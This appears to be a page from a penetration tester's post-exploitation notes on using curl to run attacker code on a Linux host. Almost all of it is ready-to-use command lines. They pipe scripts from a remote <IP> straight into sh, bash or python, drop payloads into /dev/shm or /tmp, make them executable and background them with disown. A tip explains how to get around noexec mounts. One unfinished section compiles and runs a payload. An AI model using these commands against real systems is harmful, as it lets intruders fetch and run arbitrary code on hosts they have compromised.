# cURL

## 01 - Fileless Code Execution

```
$ curl http[s]://<IP>/payload.sh | sh

$ curl http[s]://<IP>/payload.sh | bash

$ curl http[s]://<IP>/payload.py | python
```

## 02 - Dropping On Memory

> [!INFO] Got Permission Denied!
> If you get a `Permission denied` error while executing it in `/dev/shm/`. Check the [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xM - System and Kernel Version/Manual/Living off the Land#^017cc1|mounted drives]] if `noexec` is configured. Otherwise execute it with a [[#01 - Fileless Code Execution|fileless]] method.

Download payload and execute it.

```
$ curl -o /dev/shm/payload http[s]://<IP>/payload && chmod +x /dev/shm/payload && /dev/shm/payload & disown
```

## 03 - Dropping On Disk

Download payload and execute it.

```
$ curl -o /tmp/payload http[s]://<IP>/payload && chmod +x /tmp/payload && /tmp/payload & disown
```

## 04 - Compiled After Delivery

TODO: Fill this info

```
$ gcc -o payload payload.c && payload & disown
```

---
## References

### GTFOBins

- [GTFOBins: curl](https://gtfobins.github.io/gtfobins/curl/)

### GTFOArgs

- [GTFOArgs: curl](https://gtfoargs.github.io/gtfoargs/curl/)